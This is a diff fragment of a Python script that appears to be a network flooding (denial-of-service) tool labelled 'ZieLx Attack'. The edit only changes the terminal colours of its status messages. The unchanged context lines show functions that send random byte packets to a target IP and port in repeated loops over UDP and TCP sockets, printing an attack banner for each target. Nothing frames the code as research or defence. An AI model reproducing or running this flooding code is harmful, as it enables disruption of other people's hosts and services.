@@ -46,9 +46,9 @@ def wibu():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(f" \033[92m[•] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")
+			print(f" \033[92m[•] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
 		except:
-			print(f" \033[92m[×] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")
+			print(f" \033[92m[×] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
 
 def wibu2():
 	data = random._urandom(16)
@@ -59,9 +59,9 @@ def wibu2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(f" \033[92m[•] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")
+			print(f" \033[92m[•] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
 		except:
-			print(f" \033[92m[×] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")
+			print(f" \033[92m[×] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
 
 
 # Threads
